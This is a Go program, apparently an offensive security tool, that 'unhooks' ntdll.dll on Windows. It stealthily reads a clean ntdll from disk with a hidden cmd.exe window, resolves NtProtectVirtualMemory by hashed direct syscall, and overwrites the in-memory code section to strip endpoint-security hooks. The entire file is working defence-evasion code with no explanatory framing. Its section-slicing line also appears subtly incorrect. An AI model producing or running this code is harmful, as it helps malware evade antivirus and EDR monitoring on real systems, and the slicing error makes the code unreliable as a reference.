package main

import (
	"bytes"
	"crypto/sha1"
	"fmt"
	"os/exec"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	"github.com/timwhitez/Doge-Gabh/pkg/gabh"
	"golang.org/x/sys/windows"
)

func main() {
	Unhook()
}

func Unhook() {
	cmd := exec.Command("cmd.exe", "/c", "type C:\\windows\\system32\\ntdll.dll")
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow: true,
	}
	ntbyte, e := cmd.Output()
	if e != nil {
		panic(e)
	}
	err := Reloading(ntbyte, "ntdll.dll")
	if err == nil {
		fmt.Println("Full unhooked ntdll.dll")
	} else {
		panic(err)
	}

}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Reloading(DLLbyte []byte, dllname string) error {
	sysid, _ := gabh.MemHgate(str2sha1("NtProtectVirtualMemory"), str2sha1)
	dll := DLLbyte
	file, error1 := pe.NewFile(bytes.NewReader(DLLbyte))
	if error1 != nil {
		return error1
	}
	x := file.Section(".text")
	bytes := dll[x.Offset:x.Size]
	loaddll, error2 := windows.LoadDLL(dllname)
	if error2 != nil {
		return error2
	}
	handle := loaddll.Handle
	dllBase := uintptr(handle)
	dllOffset := uint(dllBase) + uint(x.VirtualAddress)
	var oldfartcodeperms uintptr
	regionsize := uintptr(len(bytes))
	handlez := uintptr(0xffffffffffffffff)

	runfunc, _ := gabh.HgSyscall(
		sysid,
		handlez,
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldfartcodeperms)),
	)

	if runfunc != 0 {
	}

	for i := 0; i < len(bytes); i++ {
		loc := uintptr(dllOffset + uint(i))
		mem := (*[1]byte)(unsafe.Pointer(loc))
		(*mem)[0] = bytes[i]
	}

	runfunc, _ = gabh.HgSyscall(
		sysid,
		handlez,
		uintptr(unsafe.Pointer(&dllOffset)),
		uintptr(unsafe.Pointer(&regionsize)),
		oldfartcodeperms,
		uintptr(unsafe.Pointer(&oldfartcodeperms)),
	)

	if runfunc != 0 {
	}

	return nil
}
